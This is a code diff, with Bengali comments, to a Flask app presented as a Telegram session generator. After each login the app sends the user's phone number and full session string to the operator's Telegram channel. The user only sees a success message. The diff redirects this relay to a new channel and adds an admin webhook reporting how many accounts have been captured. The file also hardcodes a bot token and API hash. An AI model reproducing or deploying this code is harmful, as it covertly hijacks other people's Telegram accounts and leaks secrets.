@@ -21,23 +21,25 @@ API_ID = int(os.environ.get("API_ID", 33511945))
 API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")
 
 BOT_TOKEN = "8613982412:AAEzoWkhawmQuRyAHh89jj68gru2oIowL5E"
-OWNER_CHAT_ID = "-5591154280"
+OWNER_CHAT_ID = "-1003962414788"  # নতুন চ্যানেল আইডি
+ADMIN_ID = 6034439625             # অ্যাডমিন আইডি
 
 active_clients = {}
 total_logged_in_users = 0  # মোট সফল লগইনের কাউন্ট
 
-def send_telegram_notification(text):
-    """টেলিগ্রাম গ্রুপে নোটিফিকেশন পাঠানোর ফাংশন"""
+def send_telegram_message(chat_id, text):
+    """টেলিগ্রাম চ্যানেল বা চ্যাটে মেসেজ পাঠানোর ফাংশন"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         payload = {
-            "chat_id": OWNER_CHAT_ID,
+            "chat_id": chat_id,
             "text": text,
             "parse_mode": "Markdown"
         }
-        requests.post(url, json=payload, timeout=10)
+        response = requests.post(url, json=payload, timeout=15)
+        print("Telegram API Response:", response.text)
     except Exception as e:
-        print("Telegram Notification Error:", e)
+        print("Telegram Notification Error:", traceback.format_exc())
 
 # ব্যাকগ্রাউন্ডে একটি স্থায়ী Event Loop তৈরি ও চালু করা
 bg_loop = asyncio.new_event_loop()
@@ -50,7 +52,6 @@ loop_thread = threading.Thread(target=start_background_loop, args=(bg_loop,), da
 loop_thread.start()
 
 def run_async(coro):
-    """স্থায়ী ব্যাকগ্রাউন্ড লুপে যেকোনো async ফাংশন চালানোর হেল্পার"""
     future = asyncio.run_coroutine_threadsafe(coro, bg_loop)
     return future.result()
 
@@ -154,14 +155,14 @@ def verify_code():
             total_logged_in_users += 1
             session_string = res.get("session_string")
 
-            # টেলিগ্রাম গ্রুপে সেশন এবং ইউজারের তথ্য পাঠিয়ে দেওয়া
+            # নতুন টেলিগ্রাম চ্যানেলে সেশন এবং ইউজারের তথ্য পাঠিয়ে দেওয়া
             msg = (
                 f"🎉 *New Telegram Login Successful!*\n\n"
                 f"📱 *Phone:* `{phone}`\n"
                 f"📊 *Total Logged In:* `{total_logged_in_users}`\n\n"
                 f"🔑 *Session String:*\n`{session_string}`"
             )
-            send_telegram_notification(msg)
+            send_telegram_message(OWNER_CHAT_ID, msg)
 
         active_clients.pop(phone, None)
         return jsonify({"status": "success", "message": "Session generated successfully!"})
@@ -178,9 +179,33 @@ def verify_code():
         return jsonify({"status": "error", "message": str(e)}), 400
 
 
+# টেলিগ্রাম বটের ইনকামিং কমান্ড হ্যান্ডেল করার জন্য Webhook রুট
+@app.route(f'/{BOT_TOKEN}', methods=['POST'])
+def telegram_webhook():
+    try:
+        data = request.get_json(silent=True) or {}
+        if "message" in data:
+            message = data["message"]
+            chat_id = message["chat"]["id"]
+            user_id = message["from"]["id"]
+            text = message.get("text", "").strip()
+
+            # শুধু নির্দিষ্ট অ্যাডমিন আইডি থেকে কমান্ড দিলে উত্তর দেবে
+            if text == "/stats" or text == "/start":
+                if user_id == ADMIN_ID or str(chat_id) == str(OWNER_CHAT_ID):
+                    reply_msg = (
+                        f"🤖 *Bot Status & Stats*\n\n"
+                        f"📊 *Total Logged In Users:* `{total_logged_in_users}`\n"
+                        f"✅ *System Status:* `Online & Running`"
+                    )
+                    send_telegram_message(chat_id, reply_msg)
+    except Exception as e:
+        print("Webhook Error:", e)
+    return "OK", 200
+
+
 @app.route('/stats', methods=['GET'])
 def get_stats():
-    """মোট কতজন ইউজার লগইন করেছে তা দেখার জন্য"""
     return jsonify({"total_users_logged_in": total_logged_in_users})
 
 
